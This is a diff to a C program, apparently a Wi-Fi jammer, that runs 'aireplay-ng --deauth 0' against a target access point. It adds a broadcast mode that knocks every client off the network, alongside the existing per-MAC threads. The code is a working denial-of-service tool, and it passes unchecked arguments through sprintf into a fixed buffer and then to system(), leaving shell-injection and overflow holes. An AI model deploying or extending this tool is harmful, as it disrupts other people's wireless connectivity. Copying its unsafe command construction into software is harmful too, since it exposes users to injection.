@@ -13,7 +13,7 @@
 
   License     [GPLv2, see LICENSE.md]
   
-  Revision    [beta-04, 2013-12-17]
+  Revision    [beta-04, 2014-01-05]
 
 ******************************************************************************/
 
@@ -56,7 +56,7 @@ int main (int argc, char *argv[])
 
 	//syntax
 	if (argc < 4) {
-		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
+		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE/BROADCAST]\n", argv[0]);
 		return (EXIT_FAILURE);
 	}
 	//check execution permissions
@@ -70,30 +70,37 @@ int main (int argc, char *argv[])
 		return (EXIT_FAILURE);
 	}
 
-	dim = 0;
-	//reading MACs list
-	if ((maclst = freadMaclist(argv[3])) == NULL)
-		return (EXIT_FAILURE);
-	if ((dim = getDim(maclst)) == 0) {
-		fprintf(stderr, "\nError: file empty o wrong content!\n");
-		freeMem(maclst);
-		return (EXIT_FAILURE);
-	}
 	//setting up variables
 	bssid = argv[1];
 	mon = argv[2];
 	setbuf(stdout, NULL);
 
-	//creation of threads
-	fprintf(stdout, "\tStarting %d deauths:\n", dim);
-	for (i=0; i<dim; i++) {
-		ris = pthread_create(&tid, NULL, jammer, (void *) getMac(maclst, i));
-		if (ris) {
-			fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
+	//launch broadcast deauth in single thread if specified from arguments
+	if (!strcmp(argv[3], "BROADCAST")) { 
+		jammer(NULL);
+	}
+	else {
+		dim = 0;
+		//reading MACs list
+		if ((maclst = freadMaclist(argv[3])) == NULL)
+			return (EXIT_FAILURE);
+		if ((dim = getDim(maclst)) == 0) {
+			fprintf(stderr, "\nError: file empty o wrong content!\n");
+			freeMem(maclst);
 			return (EXIT_FAILURE);
 		}
+
+		//creation of threads
+		fprintf(stdout, "\tStarting %d deauths:\n", dim);
+		for (i=0; i<dim; i++) {
+			ris = pthread_create(&tid, NULL, jammer, (void *) getMac(maclst, i));
+			if (ris) {
+				fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
+				return (EXIT_FAILURE);
+			}
+		}
+		pause();
 	}
-	pause();
 
 	pthread_exit(NULL);
 }
@@ -105,8 +112,14 @@ static void *jammer(void *mac)
 	char *addr;
 	char death[BUFF]={"aireplay-ng --deauth 0 -a"};
 
-	addr = (char *)mac;
-	sprintf(death, "%s %s -c %s %s --ignore-negative-one", death, bssid, addr, mon);
+	//broadcast deauth
+	if (mac == NULL)
+		sprintf(death, "%s %s %s --ignore-negative-one", death, bssid, mon);
+	//single MAC deauth
+	else {
+		addr = (char *)mac;
+		sprintf(death, "%s %s -c %s %s --ignore-negative-one", death, bssid, addr, mon);
+	}
 	system(death);
 
 	pthread_exit(NULL);
